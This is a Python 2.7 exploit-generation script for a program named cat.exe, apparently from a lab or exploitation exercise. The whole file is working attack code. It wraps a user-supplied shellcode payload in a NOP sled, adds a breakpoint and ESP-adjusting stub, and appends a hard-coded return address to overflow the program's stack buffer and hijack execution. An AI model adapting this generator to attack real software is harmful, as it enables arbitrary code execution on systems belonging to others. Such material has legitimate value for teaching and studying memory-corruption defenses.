"""

## `exploit.py`

___(python 2.7)___

> ***This is the final exploit generation script for `cat.exe`.***

"""

def main():
	import argparse
	import re
	
	parser = argparse.ArgumentParser(description='Exploit cat.')
	parser.add_argument('payload', type=argparse.FileType('r'), help="The file containing the payload")
	parser.add_argument('--exploit', type=argparse.FileType('wb'), default="exploit.dat", help="The output file.")
	parser.add_argument('--breakpoint', action='store_true', help="Add a breakpoint (INT 3) before payload.")
	parser.add_argument('--silent', action='store_true', help='No other output.')
	args = parser.parse_args()

	if not args.silent:
		print("\n] Exploit for cat.exe...\n")
		print("] Payload file: " + re.search("'(.*)',", str(args.payload)).group(1))
		print("] Exploit file: " + re.search("'(.*)',", str(args.exploit)).group(1))

	payload = args.payload.read(0x1000)
	exploit = generate(payload, vars(args))
	args.exploit.write(exploit)
	
def generate(payload, args={}):
	'''
	Generates an exploit for cat.exe
	
	Arguments
	  payload: bytearray or hex string containing the payload.
	
	Returns
	  An exploit for cat.exe
	  
	'''
	from binascii import unhexlify
	from struct import pack
	
	silent = args["silent"] if "silent" in args else True
	breakpoint = args["breakpoint"] if "breakpoint" in args else False
	
	if type(payload) is str: payload = unhexlify(payload)

	# breakpoint and modify ESP 
	stub = (b"\xCC" if breakpoint else b"") + b"\x81\xC4\xEC\xFB\xFF\xFF"
	
	address = 0x19FA54
	maximum = 1028
	nopsize = maximum - len(payload) - len(stub)
	middle = int(nopsize / 2)
	
	if nopsize < 0:
		if not silent: print("Payload size is too large!")
		return b''
	
	for v in payload:
		if v < 32:
			if not silent: print("Payload contains control characters!")
			return b''

	# Make sure the "middle" address doesn't contain control chars
	if ((address + middle) & 0xFF) < 32: middle -= 32

	if not silent:
		print("")
		print("] Nopsled size:   {:>4}".format(nopsize))
		print("]    Stub size: + {:>4}  ({})".format(len(stub), ("breakpoint, " if breakpoint else "") + "modify ESP"))
		print("] Payload size: + {:>4}".format(len(payload)))
		print("] Address size: + {:>4}".format(4))
		print("]   Total size: = {:>4}".format(nopsize + len(payload) + len(stub) + 4))
		print("")
		print("]  Start address:   {:>8}".format(hex(address)))
		print("] Middle nopsled: + {:>8}".format(hex(middle)))
		print("] Return address: = {:>8}".format(hex(address + middle)))
	
	return b"\x90" * nopsize + stub + payload + pack('i', address + middle)

if __name__ == "__main__": main()